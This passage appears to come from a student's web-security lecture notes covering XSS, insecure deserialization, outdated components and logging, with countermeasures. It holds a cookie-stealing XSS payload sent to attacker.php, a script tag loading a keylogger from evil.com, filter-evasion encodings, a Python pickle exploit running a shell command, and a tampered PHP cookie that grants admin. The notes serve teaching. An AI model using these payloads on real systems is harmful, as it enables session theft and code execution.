+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># Call script xss.py</span>
+<span class="n">xss</span><span class="o">/</span><span class="err">?</span><span class="n">name</span><span class="o">=&lt;</span><span class="n">script</span><span class="o">&gt;</span><span class="n">location</span><span class="o">.</span><span class="n">href</span><span class="o">=</span><span class="n">attacker</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">cookie</span><span class="o">=</span><span class="n">document</span><span class="o">.</span><span class="n">cookie</span><span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html"><span class="c">&lt;!--Result--&gt;</span>
+<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>XSS Demo<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+    Hello <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="nx">attacker</span><span class="p">.</span><span class="nx">php</span><span class="o">?</span><span class="nx">cookie</span><span class="o">=</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>! 
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Small example but a lot of threats</p>
+<ul>
+<li>
+<p>Line 3: JavaScript can be easily injected</p>
+</li>
+<li>
+<p>In this example the victim is redirected</p>
+</li>
+<li>
+<p>The cookie is transferred to the attacker</p>
+</li>
+<li>
+<p>Malware code acts in the context of the victim.com domain!</p>
+</li>
+</ul>
+<h6 id="xss-examples">XSS Examples</h6>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://foo.com/&#34;</span> <span class="na">onMouseOver</span><span class="o">=</span><span class="s">&#34;alert(1);&#34;</span><span class="p">&gt;</span>Foo.com<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span> 
+<span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://www.steve.org.uk/images/Steve/2.jpg&#34;</span> <span class="na">onMouseOver</span><span class="o">=</span><span class="s">&#34;alert(document.cookie);&#34;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://www.evil.com/keylogger.js&#34;</span><span class="p">&gt;</span><span class="o">=</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h6 id="xss-countermeasures">XSS Countermeasures</h6>
+<p>Preventing injection of scripts into HTML is difficult!</p>
+<ul>
+<li>
+<p>Blocking &ldquo;&lt;&rdquo; and &ldquo;&gt;&rdquo; is not enough</p>
+</li>
+<li>
+<p><strong>Event handlers</strong> (e.g. onMouseover), <strong>stylesheets</strong>(CSS), <strong>encoded inputs</strong> (%3C), etc.</p>
+</li>
+<li>
+<p>phpBB allowed simple HTML tags like <b></p>
+<p><code>&lt;b c=&quot;&gt;&quot; onmouseover=&quot;script&quot; x=&quot;&lt;b &quot;&gt;Hello&lt;b&gt;</code></p>
+</li>
+</ul>
+<p>Any user input <u>must</u> be preprocessed before it is used inside HTML</p>
+<ul>
+<li>
+<p>In Python, <code>cgi.escape(string, quot)</code> will replace all special characters with their HTML codes</p>
+<p><code>input = &quot;&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;   Convert into &amp;quot;&amp;gt;&amp;lt;script&amp;gt;prompt(%27XSS%27)&amp;lt;/script&amp;gt;</code></p>
+</li>
+</ul>
+<p>Why Blacklisting is not a good idea?</p>
+<ul>
+<li>
+<p>70 equivalent representations only for one character &ldquo;&lt;&rdquo;</p>
+<p><code>&lt;, %3C, &amp;lt, &amp;lt;, &amp;LT, &amp;LT;, &amp;#60, &amp;#060, &amp;#0060, &amp;#00060, &amp;#000060, &amp;#0000060, &amp;#60;, &amp;#060;, &amp;#0060;, &amp;#00060;, &amp;#000060;, &amp;#0000060;, &amp;#x3c, &amp;#x03c, &amp;#x003c, &amp;#x0003c, &amp;#x00003c, &amp;#x000003c, &amp;#x3c;, &amp;#x03c;, &amp;#x003c;, &amp;#x0003c;, &amp;#x00003c;, &amp;#x000003c;, &amp;#X3c, &amp;#X03c, &amp;#X003c, &amp;#X0003c, &amp;#X00003c, &amp;#X000003c, &amp;#X3c;, &amp;#X03c;, &amp;#X003c;, &amp;#X0003c;, &amp;#X00003c;, &amp;#X000003c;, &amp;#x3C, &amp;#x03C, &amp;#x003C, &amp;#x0003C, &amp;#x00003C, &amp;#x000003C, &amp;#x3C;, &amp;#x03C;, &amp;#x003C;, &amp;#x0003C;, &amp;#x00003C;, &amp;#x000003C;, &amp;#X3C, &amp;#X03C, &amp;#X003C, &amp;#X0003C, &amp;#X00003C, &amp;#X000003C, &amp;#X3C;&amp;#X03C;, &amp;#X003C;, &amp;#X0003C;, &amp;#X00003C;, &amp;#X000003C;, \x3c, \x3C, \u003c, \u003C</code></p>
+</li>
+<li>
+<p>Encoding-Tricks</p>
+<p>UTF-8: <code>&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97 ...</code></p>
+<p>UTF-8 Long: <code>&lt;IMG SRC=&amp;#0000106&amp;#0000097 ...</code></p>
+<p>Hex: <code>&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61 ...</code></p>
+</li>
+</ul>
+<h6 id="what-xss-can-do-myspace-worm-samy">What XSS can do? MySpace Worm Samy</h6>
+<p>Users can post HTML on their MySpace pages.</p>
+<p>MySpace does not allow scripts in users&rsquo; HTML.</p>
+<ul>
+<li>
+<p>No <code>&lt;script&gt;</code>,<code>&lt;body&gt;</code>, <code>onclick</code>, <code>&lt;a href=javascript://&gt;</code>,</p>
+<p>but allows <code>&lt;div&gt;</code> tags for CSS</p>
+</li>
+<li>
+<p><code>&lt;div style=&quot;background:url('javascript:alert(&quot;text&quot;)')&quot;&gt;</code></p>
+<p>but MySpace will strip out <code>&quot;javascript&quot;</code></p>
+</li>
+<li>
+<p>Use &ldquo;<code>java&lt;NEWLINE&gt;script</code>&rdquo; instead</p>
+<p>but MySpace will strip out quotes</p>
+</li>
+<li>
+<p>Convert from decimal instead: <code>alert(String.fromCharCode(34))</code></p>
+</li>
+</ul>
+<p>Started on &ldquo;samy&rdquo; MySpace page</p>
+<p>Everybody who visits an infected page, becomes infected and adds &ldquo;samy&rdquo; as a friend.</p>
+<p>5 hours later &ldquo;samy&rdquo; had 1,005,831 friends =&gt; adding 1,000 friends per second at its peak</p>
+<h5 id="12210-insecure-deserialization">12.2.10 Insecure Deserialization</h5>
+<p>Application A wants to share the state of an object with Application B.</p>
+<p><strong>Serialization</strong>: Covert Objects =&gt; Byte Stream</p>
+<p><strong>Deseralization</strong>: Convert Byte Stream =&gt; Objects.</p>
+<p>This can be very dangerous.</p>
+<h6 id="examples">Examples</h6>
+<ol>
+<li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># Import dependencies</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">_pickle</span>
+   
+<span class="c1"># Attacker prepares exploit that application will insecurely deserialize</span>
+<span class="k">class</span> <span class="nc">Exploit</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">,))</span>
+<span class="c1"># Attacker serializes the exploit</span>
+<span class="k">def</span> <span class="nf">serialize_exploit</span><span class="p">():</span>
+    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">_pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">Exploit</span><span class="p">())</span>
+    <span class="k">return</span> <span class="n">shellcode</span>
+<span class="c1"># Application insecurely deserializes the attacker&#39;s serialized data</span>
+<span class="k">def</span> <span class="nf">insecure_deserialization</span><span class="p">(</span><span class="n">exploit_code</span><span class="p">):</span>
+    <span class="n">__pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">exploit_code</span><span class="p">)</span>
+   
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+<span class="c1"># Serialize the exploit</span>
+    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">serialize_exploit</span><span class="p">()</span>
+<span class="c1"># Attacker&#39;s payload runs a &#39;whoami&#39; command</span>
+    <span class="n">insecure_deserialization</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>A PHP forum uses PHP object serialization to save a &ldquo;super&rdquo; cookie, containing the user&rsquo;s user ID, role, password hash, and other state:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">a:4:{i:0;i:132;i:1;s:7:&#34;Mallory&#34;;i:2;s:4:&#34;user&#34;; i:3;s:32:&#34;b6a8b3bea87fe0e05022f8f3c88bc960&#34;;}
+</code></pre></td></tr></table>
+</div>
+</div><p>An attacker changes the serialized object to give themselves admin privileges:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">a:4:{i:0;i:1;i:1;s:5:&#34;Alice&#34;;i:2;s:5:&#34;admin&#34;;i:3;s:32:&#34;b6a8b3bea87fe0e05022f8f3c88bc960&#34;;}
+</code></pre></td></tr></table>
+</div>
+</div></li>
+</ol>
+<h6 id="insecure-deserialization-countermeasures">Insecure Deserialization Countermeasures</h6>
+<ul>
+<li>
+<p>Don&rsquo;t use serialization if not necessary</p>
+</li>
+<li>
+<p>Use minimal serialization e.g. CSV</p>
+</li>
+<li>
+<p>Sign strings or use MACs to prevent user modification</p>
+</li>
+</ul>
+<h5 id="12211-using-components-with-known-vulnerabilities">12.2.11 Using Components with known Vulnerabilities</h5>
+<ul>
+<li>
+<p>Many applications have these issues because most development teams do <strong>not focus on</strong> ensuring their components/libraries are <strong>up to date</strong>.</p>
+</li>
+<li>
+<p>In many cases, the developers do not even know all the components they
+are using, never mind their versions.</p>
+</li>
+<li>
+<p>Component dependencies make things even worse.</p>
+</li>
+</ul>
+<h6 id="countermeasures-2">Countermeasures</h6>
+<p>One option is not to use components that you did not write. (not realistic)
+Upgrading to new versions is critical:</p>
+<ul>
+<li>
+<p>Identify all components and the versions you are using, including all dependencies. (e.g., the Maven versions plugin).</p>
+</li>
+<li>
+<p>Monitor the security of these components in <strong>public databases</strong>, project mailing lists, and security mailing lists, and keep them up to date.</p>
+</li>
+<li>
+<p>Establish <strong>security policies</strong> governing component use, such as requiring certain software development practices, passing security tests, and acceptable licenses.</p>
+</li>
+<li>
+<p>Consider adding <strong>security wrappers</strong> around components to <u>disable unused functionality </u>and/or secure weak or vulnerable aspects of the component.</p>
+</li>
+</ul>
+<h5 id="12212-insufficient-logging--monitoring">12.2.12 Insufficient Logging &amp; Monitoring</h5>
+<ul>
+<li>
+<p>always monitor and log your applications.</p>
+</li>
+<li>
+<p>log all logins, access control failures, &hellip;</p>
+<ul>
+<li>alert/warn admin if too many failed attempts are made</li>
+</ul>
+</li>
+<li>
+<p>setup alerts and test if these alerts work, by using pen test tools</p>
+</li>
+</ul>
+</article><section class="article author"><img class="avatar" src="/img/2.png" alt><p class="name">Roesinn</p><div class="bio"><strong>Security</strong> MSc. Student <br> <strong>Web</strong> Designer</div><div class="details"></div>
+</section></div>
+<div class="article bottom"><section class="article navigation"><p><a class="link" href="/ref/rich-content/"><span class="iconfont icon-article-left"></span>Rich Content</a></p><p><a class="link" href="/ref/placeholder-text/"><span class="iconfont icon-article-right"></span>Placeholder Text</a></p></section><section class="article discussion"><div id="disqus_thread"></div>
+<script>
+
+
+
+
+
+(function() { 
+var d = document, s = d.createElement('script');
+s.src = 'https://roesinn.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</section></div></section><section id="footer"><div class="footer-wrap">
+    <p class="copyright">©2020 roesinn</p>
+</div>
+</section><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css" integrity="sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/&#43;DiW/UqRcLbRjq" crossorigin="anonymous"><script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js" integrity="sha384-y23I5Q6l&#43;B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd&#43;qj&#43;o24G5ZU2zJz" crossorigin="anonymous"></script><script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js" integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous"
+            onload="renderMathInElement(document.body);"></script>
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-168886235-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+</body>
+
+</html>
